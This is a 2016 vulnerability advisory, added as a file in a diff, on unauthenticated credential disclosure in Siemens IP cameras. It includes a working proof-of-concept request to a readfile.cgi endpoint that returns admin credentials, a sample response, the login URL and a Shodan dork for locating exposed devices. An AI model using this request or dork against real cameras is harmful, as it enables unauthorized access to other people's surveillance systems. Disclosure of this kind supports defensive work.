@@ -1,0 +1,60 @@
+1. Advisory Information
+========================================
+Title                   : SIEMENS IP-Camera Unauthenticated Remote Credentials Disclosure
+Vendor Homepage         : https://www.siemens.com
+Remotely Exploitable	: Yes
+Versions Affected       : x.2.2.1798, CxMS2025_V2458_SP1, x.2.2.1798, x.2.2.1235
+Tested on Camera types	: CVMS2025-IR, CCMS2025 (Camera type)
+Reference for CCMS2025  : https://w5.siemens.com/web/cz/cz/corporate/portal/home/produkty_a_sluzby/IBT/pozarni_a_bezpecnostni_systemy/cctv/ip_kamery/Documents/023_CCIS1425_A6V10333969_en.doc.pdf
+Vulnerability           : Username / Password Disclosure (Critical/High)
+Shodan Dork             : title:"SIEMENS IP-Camera"
+Date                    : 16/08/2016
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+ 
+ 
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+  
+
+3. Description
+========================================
+SIEMENS IP-Camera (CVMS2025-IR + CCMS2025) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
+
+
+4. Proof-of-Concept:
+========================================
+Simply go to the following url:
+http://host:port/cgi-bin/readfile.cgi?query=ADMINID
+
+Should return some javascript variable which contain the credentials and other configuration vars:
+var Adm_ID="admin"; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time="0"; 
+
+
+Request:
+----------
+GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1
+Host: host:port
+Connection: close
+
+
+Response:
+----------
+HTTP/1.0 200 OK
+Connection: close
+Content-type: text/html
+
+var Adm_ID="admin";
+var Adm_Pass1=“admin”;
+var Adm_Pass2=“admin”;
+var Language=“en”;
+var Logoff_Time="0";
+
+
+
+Login @ http://host:port/cgi-bin/chklogin.cgi
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
